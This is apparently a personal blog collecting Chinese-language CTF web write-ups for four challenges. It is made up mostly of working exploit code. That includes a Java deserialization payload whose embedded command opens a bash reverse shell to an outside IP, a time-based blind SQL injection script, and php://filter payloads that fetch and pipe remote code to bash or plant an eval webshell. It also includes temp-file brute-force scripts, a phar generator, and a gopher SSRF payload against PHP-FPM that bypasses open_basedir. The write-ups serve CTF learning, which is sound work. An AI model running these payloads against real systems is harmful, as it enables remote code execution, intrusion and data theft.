参考：https://nikoeurus.github.io/2019/10/14/RoarCTF/#%E5%90%8E%E5%8F%B0getshell
https://blog.csdn.net/mochu7777777/article/details/107550135
https://guokeya.github.io/post/zE_m1kHQm/

还是得多分析源码才能进步。

## [V&N2020 公开赛]EasySpringMVC
关键词：Java反序列化
Java反序列化没怎么仔细研究过 这两次比赛吃了很大的亏 
总结一篇博客学习一下 见 Java反序列化学习.md
http://1cd4a2bb-5036-4365-be52-3f7b33bbb5b8.node3.buuoj.cn/springmvcdemo/showpic.form?file=showpic.jsp
上传图片点 需要webmanager组权限 file参数尝试任意文件读取显示only show you picture file !（失败
开始审源码，拖到jdgui里
首先看web.xml。（web.xml是J2EE定义的描述这个webapp的一个配置文件，非常重要。）  
    <?xml version="1.0" encoding="UTF-8"?>
    <web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
             xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
             xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
             version="4.0">
        <context-param>
            <param-name>contextConfigLocation</param-name>
            <param-value>/WEB-INF/applicationContext.xml</param-value>
        </context-param>
        <listener>
            <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>
        </listener>
        <filter>
            <filter-name>clientinfo</filter-name>
            <filter-class>com.filters.ClentInfoFilter</filter-class>
        </filter>
        <filter-mapping>
            <filter-name>clientinfo</filter-name>
            <servlet-name>*</servlet-name>
        </filter-mapping>
        <servlet>
            <servlet-name>dispatcher</servlet-name>
            <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
            <load-on-startup>1</load-on-startup>
        </servlet>
        <servlet-mapping>
            <servlet-name>dispatcher</servlet-name>
            <url-pattern>*.form</url-pattern>
        </servlet-mapping>
    </web-app>
先看最下面一段：
        <servlet-mapping>
            <servlet-name>dispatcher</servlet-name>
            <url-pattern>*.form</url-pattern>
        </servlet-mapping>
该配置文件用servlet-mapping指明所有*.form格式路径的访问交给名为dispatcher的servlet处理。servlet就是处理HTTP请求的核心类。
        <servlet>
            <servlet-name>dispatcher</servlet-name>
            <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
            <load-on-startup>1</load-on-startup>
        </servlet>
再看这一段，表明这个dispatcher servlet是一个org.springframework.web.servlet.DispatcherServlet，也就是说这个webapp使用了Spring框架。
比较有趣的是还定义了一个filter。
    <filter>
        <filter-name>clientinfo</filter-name>
        <filter-class>com.filters.ClentInfoFilter</filter-class>
    </filter>
    <filter-mapping>
        <filter-name>clientinfo</filter-name>
        <servlet-name>*</servlet-name>
    </filter-mapping>
这段代码表示，对所有servlet的访问，都需要经过com.filters.ClentInfoFilter类。filter的作用一般是在HTTP请求到达servlet之前或之后，对HTTP请求或响应进行处理，比如检查这个请求是否拥有权限。
controller类WP直接一句话带过说没有有问题的地方，当然我们学习的还是得自己看一遍。
只有show类里面有个序列化 别的地方 upload不用看 index里面就是一些判断。
接下来看上面提到的filter
if (cookies != null)
      for (Cookie c : cookies) {
        if (c.getName().equals("cinfo")) {
          exist = true;
          cookie = c;
          break;
        } 
      }
可以看到filter首先从众多cookies中找到这个cinfo这个cookie。
然后下面有：bytes = Tools.create(cinfo);
跟进Tools类，芜湖！：
private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
    Object obj = in.readObject();
    (new ProcessBuilder((String[])obj)).start();
  }
}
Tools对这个字节数组直接readObject，进行反序列化操作！也就是说我们客户端提交的数据，服务器无条件信任，并反序列化。
Java的反序列化和PHP反序列化类似，php在反序列化的时候会调用对应类的__wakeup()函数，而java会调用该类readObject()函数。
如果我们构造一个Tools类，反序列化的时候，readObject会被自动调用，然后读到的obj会被强制类型转换为String[]，达到命令执行。
由于反序列化的时候读取的对象直接被传入Processbuilder，我们在Tools类内重写writeObject方法，直接将命令写入。

Tools.class

package com.tools;//一定要这个原文件同名的路径

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;

public class Tools implements Serializable {
    private static final long serialVersionUID = 1L;

    private String testCall;

    public static Object parse(byte[] bytes) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
        return ois.readObject();
    }

    public static byte[] create(Object obj) throws Exception {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream outputStream = new ObjectOutputStream(bos);
        outputStream.writeObject(obj);
        return bos.toByteArray();
    }

    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        Object obj = in.readObject();
        (new ProcessBuilder((String[])obj)).start();
    }

    private void writeObject(ObjectOutputStream out) throws IOException,ClassNotFoundException {
        String[] cmd={"bash","-c","bash -i>& /dev/tcp/121.196.169.53/3333 0>&1"};
        out.writeObject(cmd);
    }

}

example3_1.class

package example;

import com.tools.Tools;
import java.util.Base64;

public class example3_1 
{
	public static void main(String[] args) {
        Base64.Encoder encoder = Base64.getEncoder();
	try {
            Tools cinfo = new Tools();
            byte[] bytes = Tools.create(cinfo);
            String payload = encoder.encodeToString(bytes);
            System.out.println(payload);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}

## [VNCTF 2021]realezjvav
WP说笛卡尔积盲注 我偏不信 试了下别的方法 都不行 好吧 wsfw
其实在注释里已经写了both  username and password are right , then you can enter the next level
所以不能admin\这种。同时sleep benchmark都被过滤 而且没有回显 必须盲注 只能笛卡尔积试试了。
原理：
SELECT count(*) FROM information_schema.columns A,information_schema.columns B,information_schema.columns C;
根据数据库查询的特点，这句话的意思就是将 A B C 三个表进行笛卡尔积（全排列），并输出 最终的行数，执行效果如下：
执行效果是跑了十分钟都没跑出来 网上看了应该是 count(*) 六千多万
光一个表的话是三千多 一下子就能出来。
那么利用原理就是根据回显速度注入 和时间盲注一个原理(当然回显速度需要对payload进行调整)
官方exp:
import requests
import time
url = "http://cacbd0a9-16f5-497b-8346-dae9d466ddb4.node3.buuoj.cn/user/login"
i = 0
flag = ""
while True :
    i += 1
    head = 32
    tail = 126
    while head < tail :
        mid = head + tail >> 1
        payload = "a' or (if(ascii(substr(password,%d,1))>%d,(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,information_schema.columns/**/B,information_schema.tables/**/C),1))#" % (i,mid)
        data = {"username":"admin" , "password" : payload}
        start_time = time.time()
        r = requests.post(url,data = data)
        print(data['password'])
        end_time = time.time()
        if end_time - start_time > 3:
            head = mid + 1
        else :
            tail = mid
    if head!=32:
        flag += chr(head)
        print(flag)
    else:
        break
注的很慢 因为那语句大概要执行6秒钟
密码no_0ne_kn0w_th1s
进去是创建角色，查看图片路径：http://cacbd0a9-16f5-497b-8346-dae9d466ddb4.node3.buuoj.cn/searchimage?img=2.png
怀疑存在任意文件读取，但是我不知道要读什么 自己随便试了一下：../../../../../../web.xml
不行，查看wp：searchimage?img=../../../../../pom.xml
？说是Spring里面pom.xml放了外部依赖，麻了。
看到fastjson
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.27</version>
</dependency>
rce：https://github.com/CaijiOrz/fastjson-1.2.47-RCE；https://y4tacker.blog.csdn.net/article/details/114949206
flag_no_one_know_abccba.txt
复现还算简单。

## 分割线———————————————————————————————————

## [WMCTF2020]Web Check in 2.0
关键词：PHP
参考https://cyc1e183.github.io/2020/08/04/WMctf2020-Checkin%E5%87%BA%E9%A2%98%E6%83%B3%E6%B3%95-%E9%A2%98%E8%A7%A3/
考点就是死亡exit的绕过，但是加了些过滤：

    preg_match('/iconv|UCS|UTF|rot|quoted|base64/i',$content)

方法一、rot移位
直接rot会被过滤，所以需要用二次编码绕过。
为什么能用二次编码呢？因为参考官方文档file_put_contents函数的源码，可以发现先会对参数进行一次urldecode。

    payload:php://filter/write=string.%7%32ot13|%3C?cuc%20flfgrz(%22phey%20uggc://xxxxxxx.xxx:xxxx/gzc/|onfu%22);?%3E|/resource=oy3.php
官方的WP有误，少了尖括号和问号。

方法二、过滤器构造绕过
题目中的过滤器/iconv|UCS|UTF|rot|quoted|base64/
php:filter支持使用多个过滤器，参考官方文档 可用过滤器列表，还留下了字符串过滤器中的部分和压缩过滤器以及加密过滤器，所以可以考虑从这几个过滤器入手，最好用的应该就是zlib的zlib.deflate和zlib.inflate，组合使用压缩后再解压后内容肯定不变，不过我们可以在中间遍历一下剩下的几个过滤器，看看中间进行什么操作会影响后续inflate的内容，简单遍历一下可以发现中间插入string.tolower转后会把空格和exit处理了就可以绕过exit👇

    官方payload（未试）：php://filter/zlib.deflate|string.tolower|zlib.inflate|?><?php%0deval($_GET[1]);?>/resource=Cyc1e.php
方法三、爆破临时文件（复制官方WP）
题目的环境特地设置了php 7.0.33版本，由于file_put_contents也可以利用伪协议，所以利用再利用string.strip_tags会发生segment fault，这时候上传一个webshell会以临时文件的形式保存在/tmp中（老知识点了），利用require_once包含getshell即可（题目的设置是用一次就会被覆盖，所以直接反弹shell或者写马就行，这个是一个最不好的解作为题目的备选解）。

不过实际运维题目的时候，因为爆破的基数太大了，在比赛的时候太多人同时爆破形成了DDOS了，服务器也承受不住，所以我们没办法，只好选择封堵这条路了（莫怪）。简单放下生成临时文件的脚本（LFI via SegmentFault copy的）👇

    import requests
    import string
    import itertools
    
    charset = string.digits + string.letters
    
    host = "web_checkin2.wmctf.wetolink.com"
    port = 80
    base_url = "http://%s:%d" % (host, port)
    
    
    def upload_file_to_include(url, file_content):
        files = {'file': ('evil.jpg', file_content, 'image/jpeg')}
        try:
            response = requests.post(url, files=files)
        except Exception as e:
            print e
    
    def generate_tmp_files():
        file_content = '<?php system("xxxxxxxx");?>'
        phpinfo_url = "%s/?content=php://filter/write=string.strip_tags/resource=Cyc1e.php" % (
            base_url)
        print phpinfo_url
        length = 6
        times = len(charset) ** (length / 2)
        for i in xrange(times):
            print "[+] %d / %d" % (i, times)
            upload_file_to_include(phpinfo_url, file_content)
    
    if __name__ == "__main__":
        generate_tmp_files()


    #!/usr/bin/env python
    # -*- coding: utf-8 -*-
    
    import requests
    import string
    
    charset = string.digits + string.letters
    
    host = "web_checkin2.wmctf.wetolink.com"
    port = 80
    base_url = "http://%s:%d" % (host, port)
    
    
    def brute_force_tmp_files():
        for i in charset:
            for j in charset:
                for k in charset:
                    for l in charset:
                        for m in charset:
                            for n in charset:
                                filename = i + j + k + l + m + n
                                url = "%s/index.php?content=/tmp/php%s" % (
                                    base_url, filename)
                                print url
                                try:
                                    response = requests.get(url)
                                    if 'flag' in response.content:
                                        print "[+] Include success!"
                                        return True
                                except Exception as e:
                                    print e
        return False
    

    def main():
        brute_force_tmp_files()
    
    
    if __name__ == "__main__":
        main()

## [NCTF2019]phar matches everything
关键词：phar反序列化；ssrf打php-fpm

WP本来不想发的，但是这道题BUU的环境有一些小变动。希望能帮到一些卡住的人。并且这道题也有很多值得学习的地方。

github把源码down下来：

    catchmine.php
    <?php
        class Easytest{
           protected $test;
            public function funny_get(){
                return $this->test;
            }
        }
        class Main {
            public $url;
            public function curl($url){
                $ch = curl_init();  
                curl_setopt($ch,CURLOPT_URL,$url);
                curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
                $output=curl_exec($ch);
                curl_close($ch);
                return $output;
            }
        
    	    public function __destruct(){
                $this_is_a_easy_test=unserialize($_GET['careful']);
                if($this_is_a_easy_test->funny_get() === '1'){
                    echo $this->curl($this->url);
               }
            }    
        }
        
        if(isset($_POST["submit"])) {
            $check = getimagesize($_POST['name']);
           if($check !== false) {
                echo "File is an image - " . $check["mime"] . ".";
            } else {
                echo "File is not an image.";
            }
        }
        ?>

upload.php

    <?php
    $target_dir = "uploads/";
    $uploadOk = 1;

    $imageFileType=substr($_FILES["fileToUpload"]["name"],strrpos($_FILES["fileToUpload"]["name"],'.')+1,strlen($_FILES["fileToUpload"]["name"]));

    $file_name = md5(time());
    $file_name =substr($file_name, 0, 10).".".$imageFileType;
    
    $target_file=$target_dir.$file_name;
    
        $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
        if($check !== false) {
            echo "File is an image - " . $check["mime"] . ".";
            $uploadOk = 1;
        } else {
            echo "File is not an image.";
            $uploadOk = 0;
        }
    
    
    if (file_exists($target_file)) {
        echo "Sorry, file already exists.";
       $uploadOk = 0;
    }
    if ($_FILES["fileToUpload"]["size"] > 500000) {
        echo "Sorry, your file is too large.";
        $uploadOk = 0;
    }
    if($imageFileType !== "jpg" && $imageFileType !== "png" && $imageFileType !== "gif" && $imageFileType !== "jpeg"  ) {
        echo "Sorry, only jpg,png,gif,jpeg are allowed.";
        $uploadOk = 0;
    }
    if ($uploadOk == 0) {
        echo "Sorry, your file was not uploaded.";
    } else {
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            echo "The file $file_name  has been uploaded to ./uploads/";
        } else {
            echo "Sorry, there was an error uploading your file.";
        }
    }
    ?>

catchmine.php里面有一个反序列化，先看这里。Main::curl()明显存在SSRF并且可使用文件流造成任意文件读取。但是要触发curl的话就没法控制main里面的url了，所以还需要上传个phar文件，在getimagesize处触发。
思路：第一次反序列化，在getimagesize处触发phar反序列化，从而控制url。第二次反序列化，执行curl。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210409003728.png)

exp：（比较简单就不自己写了，来自guoke师傅

    <?php
    class Easytest{
	    protected $test='1';
    }
    class Main{
    	public $url='file:///proc/net/arp';
    }
    $a=new Easytest();
    echo urlencode(serialize($a));
    $b=new Main();
    @unlink("phar.phar");
    $phar=new Phar("phar.phar");
    $phar->startBuffering(); 
    $phar->setStub('GIF89a'."<?php __HALT_COMPILER(); ?>"); 
    $phar->setMetadata($b); 
    $phar->addFromString("test.txt", "test");
    $phar->stopBuffering();
    ?>

第一个要注意的地方，这里etc/hosts没法读到内网ip，只能用/proc/net/arp
这里我读到的是10.0.199.2 然后具体哪个会回显PHP-FPM是要自己一个个试的 我试了3、4、5 都没有 然后直接试了11是可以的。

那么php-fpm是啥呢？跟着p牛的博客学习一下：https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html

精简下内容方便查看：

FPM其实是一个fastcgi协议解析器，Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给谁？其实就是传给FPM。

FPM按照fastcgi的协议将TCP流解析成真正的数据。

举个例子，用户访问http://127.0.0.1/index.php?a=1&b=2，如果web目录是/var/www/html，那么Nginx会将这个请求变成如下key-value对：

    {
    'GATEWAY_INTERFACE': 'FastCGI/1.0',
    'REQUEST_METHOD': 'GET',
    'SCRIPT_FILENAME': '/var/www/html/index.php',
    'SCRIPT_NAME': '/index.php',
    'QUERY_STRING': '?a=1&b=2',
    'REQUEST_URI': '/index.php?a=1&b=2',
    'DOCUMENT_ROOT': '/var/www/html',
    'SERVER_SOFTWARE': 'php/fcgiclient',
    'REMOTE_ADDR': '127.0.0.1',
    'REMOTE_PORT': '12345',
    'SERVER_ADDR': '127.0.0.1',
    'SERVER_PORT': '80',
    'SERVER_NAME': "localhost",
    'SERVER_PROTOCOL': 'HTTP/1.1'
    }

这个数组其实就是PHP中$_SERVER数组的一部分，也就是PHP里的环境变量。但环境变量的作用不仅是填充$_SERVER数组，也是告诉fpm：“我要执行哪个PHP文件”。

PHP-FPM拿到fastcgi的数据包后，进行解析，得到上述这些环境变量。然后，执行SCRIPT_FILENAME的值指向的PHP文件，也就是/var/www/html/index.php。

Nginx（IIS7）解析漏洞：fpm发现/var/www/html/favicon.ico/.php不存在，则去掉/.php，再判断/var/www/html/favicon.ico是否存在。显然这个文件是存在的，于是被作为PHP文件执行，导致解析漏洞。

在fpm某个版本之前，我们可以将SCRIPT_FILENAME的值指定为任意后缀文件，比如/etc/passwd；但后来，fpm的默认配置中增加了一个选项security.limit_extensions，只能以phpx结尾。由于这个配置项的限制，如果想利用PHP-FPM的未授权访问漏洞，首先就得找到一个已存在的PHP文件。

那么，为什么我们控制fastcgi协议通信的内容，就能执行任意PHP代码呢？

理论上当然是不可以的，即使我们能控制SCRIPT_FILENAME，让fpm执行任意文件，也只是执行目标服务器上的文件，并不能执行我们需要其执行的文件。

但PHP是一门强大的语言，PHP.INI中有两个有趣的配置项，auto_prepend_file和auto_append_file。

auto_prepend_file是告诉PHP，在执行目标文件之前，先包含auto_prepend_file中指定的文件；auto_append_file是告诉PHP，在执行完成目标文件后，包含auto_append_file指向的文件。

那么就有趣了，假设我们设置auto_prepend_file为php://input，那么就等于在执行任何php文件前都要包含一遍POST的内容。所以，我们只需要把待执行的代码放在Body中，他们就能被执行了。（当然，还需要开启远程文件包含选项allow_url_include）

那么，我们怎么设置auto_prepend_file的值？

这又涉及到PHP-FPM的两个环境变量，PHP_VALUE和PHP_ADMIN_VALUE。这两个环境变量就是用来设置PHP配置项的，PHP_VALUE可以设置模式为PHP_INI_USER和PHP_INI_ALL的选项，PHP_ADMIN_VALUE可以设置所有选项。（disable_functions除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中）

所以，我们最后传入如下环境变量：
   
    {
    'GATEWAY_INTERFACE': 'FastCGI/1.0',
    'REQUEST_METHOD': 'GET',
    'SCRIPT_FILENAME': '/var/www/html/index.php',
    'SCRIPT_NAME': '/index.php',
    'QUERY_STRING': '?a=1&b=2',
    'REQUEST_URI': '/index.php?a=1&b=2',
    'DOCUMENT_ROOT': '/var/www/html',
    'SERVER_SOFTWARE': 'php/fcgiclient',
    'REMOTE_ADDR': '127.0.0.1',
    'REMOTE_PORT': '12345',
    'SERVER_ADDR': '127.0.0.1',
    'SERVER_PORT': '80',
    'SERVER_NAME': "localhost",
    'SERVER_PROTOCOL': 'HTTP/1.1'
    'PHP_VALUE': 'auto_prepend_file = php://input',
    'PHP_ADMIN_VALUE': 'allow_url_include = On'
    }

exp：https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75

最后构造gopher协议即可
payload：

    gopher://10.0.199.11:9000/_%01%01%F6%FD%00%08%00%00%00%01%00%00%00%00%00%00%01%04%F6%FD%01%DC%00%00%0E%03CONTENT_LENGTH203%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%F6%FD%00%00%00%00%01%05%F6%FD%00%CB%00%00%3C%3Fphp%20mkdir%28%27/tmp/fuck%27%29%3Bchdir%28%27/tmp/fuck%27%29%3Bini_set%28%27open_basedir%27%2C%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bchdir%28%27..%27%29%3Bini_set%28%27open_basedir%27%2C%27/%27%29%3Bprint_r%28scandir%28%27/%27%29%29%3Breadfile%28%27/flag%27%29%3B%3F%3E%01%05%F6%FD%00%00%00%00

里面还有一个知识点，open_basedir的绕过和disable_function的限制。
四个执行函数都被ban了，用readfile代替即可。
open_basedir绕过的姿势网上有很多，这里我用的是通过chdir()和ini_set()来进行跨路径访问，网上找姿势的时候记得这里题目是php7，有些老版本的是不行的。
参考链接：https://xz.aliyun.com/t/4720

好耶 学到许多
